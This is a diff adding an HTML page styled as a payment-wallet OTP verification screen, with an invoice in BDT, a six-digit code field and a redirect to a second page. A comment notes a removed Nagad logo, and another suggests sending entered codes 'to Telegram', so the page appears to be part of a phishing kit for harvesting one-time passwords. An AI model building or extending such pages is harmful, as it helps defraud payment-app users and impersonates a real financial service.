@@ -1,0 +1,188 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>LUXURY MEMBERSHIP - OTP Verification</title>
+    <style>
+        body {
+            margin: 0;
+            padding: 0;
+            font-family: Arial, sans-serif;
+            background: url('https://imgur.com/pAA3wi6.png') no-repeat center center fixed;
+            background-size: cover;
+        }
+
+        .container {
+            text-align: center;
+            color: #D3D3D3; /* Light gray */
+            padding: 20px;
+            display: flex;
+            flex-direction: column;
+            align-items: center; /* Center all content */
+        }
+
+        .header img {
+            margin-top: 20px;
+            width: 100px;
+        }
+
+        .header h2 {
+            font-size: 1rem; /* Made smaller */
+            margin: 5px 0; /* Adjusted margin */
+        }
+
+        .info {
+            margin-top: 30px;
+            font-size: 1rem; /* Adjusted font size */
+            text-align: left;
+            padding-left: 20px;
+            width: 100%; /* Take full width */
+        }
+
+        .info p {
+            margin: 5px 0;
+        }
+
+        .input-group {
+            margin-top: 30px;
+            text-align: center; /* Center the input group */
+        }
+
+        .input-group p {
+            margin-bottom: 10px;
+            font-weight: bold; /* Made the label bold */
+        }
+
+        .input-box {
+            display: flex;
+            justify-content: center;
+            margin-top: 10px;
+        }
+
+        .input-box input {
+            width: 100px; /* Width for the OTP input */
+            height: 35px; /* Height for the OTP input */
+            font-size: 1rem; /* Adjusted font size */
+            text-align: center;
+            border: 2px solid #D3D3D3; /* Light gray border */
+            background-color: white; /* White background */
+            color: black; /* Black text */
+            border-radius: 5px; /* Rounded corners */
+            padding: 0; /* Remove padding for uniformity */
+        }
+
+        .terms {
+            margin-top: 20px;
+            font-size: 0.9rem; /* Adjusted font size */
+            color: #D3D3D3; /* Light gray */
+        }
+
+        .error-message {
+            margin-top: 10px; /* Space for error message */
+            color: yellow; /* Yellow text for error message */
+            font-size: 0.9rem; /* Adjusted font size */
+            display: none; /* Hidden by default */
+        }
+
+        .buttons {
+            margin-top: 20px; /* Adjusted margin for spacing */
+            display: flex;
+            justify-content: center; /* Center the buttons */
+        }
+
+        .buttons button {
+            padding: 5px 10px; /* Smaller padding */
+            margin: 0 5px; /* Space between buttons */
+            font-size: 0.8rem; /* Smaller font size */
+            font-weight: bold; /* Bold text */
+            color: darkred; /* Dark red color for text */
+            background-color: white; /* White background for buttons */
+            border: 2px solid #D3D3D3; /* Light gray border */
+            border-radius: 5px; /* Rounded corners */
+            cursor: pointer;
+        }
+
+        .footer {
+            margin-top: 50px;
+        }
+    </style>
+</head>
+<body>
+
+<div class="container">
+    <div class="header">
+        <img src="https://imgur.com/xCGvdyx" alt="Cart Icon"> <!-- Updated cart logo URL -->
+        <h2>LUXURY MEMBERSHIP</h2>
+    </div>
+
+    <div class="info">
+        <p><strong>Invoice No.:</strong> UID72935618843895</p>
+        <p><strong>Total Amount:</strong> BDT 1,200.00</p>
+        <p><strong>Charge:</strong> BDT 0</p>
+    </div>
+
+    <div class="input-group">
+        <p>Enter Verification Code [OTP]</p>
+        <div class="input-box">
+            <input type="text" maxlength="6" id="otpInput" placeholder="XXXXXX" pattern="\d*" inputmode="numeric">
+        </div>
+    </div>
+
+    <div class="terms">
+        By clicking/tapping "Proceed" you are agreeing to our Terms and Conditions
+    </div>
+
+    <div class="error-message" id="error-message">
+        Invalid OTP
+    </div>
+
+    <div class="buttons">
+        <button onclick="validateOTP()">Proceed</button>
+        <button onclick="resendCode()">Resend Code</button>
+        <button class="cancel">Close</button>
+    </div>
+
+    <div class="footer">
+        <!-- Nagad logo removed -->
+    </div>
+</div>
+
+<script>
+    // Validate OTP on "Proceed" button click
+    function validateOTP() {
+        const otpInput = document.getElementById('otpInput');
+        const otp = otpInput.value;
+
+        // Check if the OTP is 6 digits
+        if (otp.length !== 6) {
+            document.getElementById('error-message').style.display = 'block'; // Show error message
+        } else {
+            document.getElementById('error-message').style.display = 'none'; // Hide error message
+            // Implement success logic here (e.g., redirect, send to Telegram, etc.)
+            window.location.href = 'index2.html'; // Redirect to index2.html
+        }
+    }
+
+    // Function to resend OTP code
+    function resendCode() {
+        // Implement the logic to resend the OTP code here
+        alert('OTP Code has been resent!');
+    }
+
+    // Prevent non-numeric input for OTP
+    const otpInput = document.getElementById('otpInput');
+    otpInput.addEventListener('keydown', (event) => {
+        // Allow: backspace, delete, tab, escape, enter
+        if (event.key === "Backspace" || event.key === "Delete" || event.key === "Tab" || event.key === "Escape" || event.key === "Enter") {
+            return;
+        }
+        // Ensure that it is a number and stop the keypress if not
+        if ((event.shiftKey || (event.key < '0' || event.key > '9'))) {
+            event.preventDefault(); // Prevent non-numeric input
+        }
+    });
+</script>
+
+</body>
+</html>
